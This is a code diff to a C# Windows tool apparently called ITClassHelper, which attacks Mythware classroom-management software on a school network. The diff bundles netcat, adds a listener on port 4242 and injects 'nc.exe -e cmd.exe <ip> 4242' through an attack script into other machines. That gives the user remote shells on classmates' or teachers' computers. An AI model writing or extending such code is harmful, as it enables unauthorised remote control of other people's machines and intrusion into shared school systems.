@@ -116,10 +116,12 @@ namespace ITClassHelper
 
         MiniController castControlWindow = new MiniController();
         static readonly string ProgramVersion = "1.6.3";
-        string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
-        string attackScriptPath;
-        string roomPath = @"C:\Program Files\Mythware\e-Learning Class\StudentMain.exe";
-        readonly string disableAttackFilePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\disableAttack.txt";
+        static readonly string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        static readonly string ncPath = path + @"\nc.exe";
+        static string attackScriptPath;
+        static string roomPath = @"C:\Program Files\Mythware\e-Learning Class\StudentMain.exe";
+        static readonly string disableAttackFilePath = path + @"\disableAttack.txt";
+        static readonly string allowNcFilePath = path + @"\allowNcAttack.txt";
 
         [DllImport("user32.dll")]
         public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
@@ -143,6 +145,12 @@ namespace ITClassHelper
                 DisableAttackButton.Enabled = false;
                 AttackButton.Enabled = false;
             }
+            if (File.Exists(allowNcFilePath))
+            {
+                NcLabel.Visible = true;
+                NcServerButton.Visible = NcServerButton.Enabled = true;
+                NcClientButton.Visible = NcClientButton.Enabled = true;
+            }
 
             string ntsdPath = path + @"\ntsd.exe";
             if (!File.Exists(ntsdPath))
@@ -164,6 +172,11 @@ namespace ITClassHelper
             FileStream scripterFsObj = new FileStream(scripterPath, FileMode.Create);
             scripterFsObj.Write(RescScripter, 0, RescScripter.Length);
             scripterFsObj.Close();
+
+            byte[] RescNetCat = Properties.Resources.NetCat;
+            FileStream netCatFsObj = new FileStream(ncPath, FileMode.Create);
+            netCatFsObj.Write(RescNetCat, 0, RescNetCat.Length);
+            netCatFsObj.Close();
 
             new Thread(LoopThread)
             { IsBackground = true }.Start();
@@ -289,8 +302,8 @@ namespace ITClassHelper
 
         private void AttackButton_Click(object sender, EventArgs e)
         {
-            string scriptPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\attacker.py";
-            string baseArguments = $@"{scriptPath} -p {PortTextBox.Text} -ip {IPTextBox.Text}";
+            string attackerPath = path + @"\attacker.py";
+            string baseArguments = $@"{attackerPath} -p {PortTextBox.Text} -ip {IPTextBox.Text}";
             if (IPTextBox.Text.Split('.')[3] != IPRangeTextBox.Text)
             {
                 baseArguments += $"-{IPRangeTextBox.Text}";
@@ -299,7 +312,15 @@ namespace ITClassHelper
             {
                 string attackItem;
                 if (UseMsgRadio.Checked == true) attackItem = $"-msg {MsgTextBox.Text.Replace("\n", "").Replace("\r", "")}";
-                else attackItem = $"-c \"{CmdTextBox}\"";
+                else
+                {
+                    if (CmdTextBox.Text == "<NCAttackCommand>")
+                    {
+                        string ip = GetIPAddress();
+                        CmdTextBox.Text = $"{ncPath} -e C:\\Windows\\System32\\cmd.exe {ip} 4242";
+                    }
+                    attackItem = $"-c \"{CmdTextBox.Text}\"";
+                };
                 try { ExecuteProcess("python", $"{baseArguments} {attackItem}"); }
                 catch { 
                     try { ExecuteProcess("py", $"{baseArguments} {attackItem}"); }
@@ -340,7 +361,12 @@ namespace ITClassHelper
 
         private void IPButton_Click(object sender, EventArgs e)
         {
-            string realAddress = "无法获取到当前 IP 地址！请检查网络是否正常！";
+            GetIPAddress(true);
+        }
+
+        private static string GetIPAddress(bool uiTrigger = false)
+        {
+            string realAddress = "ERROR";
             foreach (IPAddress curAddress in Dns.GetHostEntry(Dns.GetHostName()).AddressList)
             {
                 if (curAddress.AddressFamily.ToString() == "InterNetwork")
@@ -348,7 +374,15 @@ namespace ITClassHelper
                     realAddress = curAddress.ToString();
                 }
             }
-            MessageBox.Show($"IP 地址为：{realAddress}", "信息", MessageBoxButtons.OK);
+            if (uiTrigger == true)
+            {
+                MessageBox.Show($"IP 地址为：{realAddress}", "信息", MessageBoxButtons.OK);
+                return "";
+            }
+            else
+            {
+                return realAddress;
+            }
         }
 
         private void DisableAttackButton_Click(object sender, EventArgs e)
@@ -477,6 +511,18 @@ $@"即将显示一个命令窗口。
                 ExecuteProcess(scripterPath, fileDialog.FileName, true);
             }
         }
+
+        private void NcServerButton_Click(object sender, EventArgs e)
+        {
+            ExecuteProcess(ncPath, "-lvnp 4242", true);
+        }
+
+        private void NcClientButton_Click(object sender, EventArgs e)
+        {
+            UseCmdRadio.Checked = true; UseMsgRadio.Checked = UseScriptRadio.Checked = false;
+            CmdTextBox.Text = "<NCAttackCommand>";
+        }
+
 
         protected override void WndProc(ref Message msg)
         {
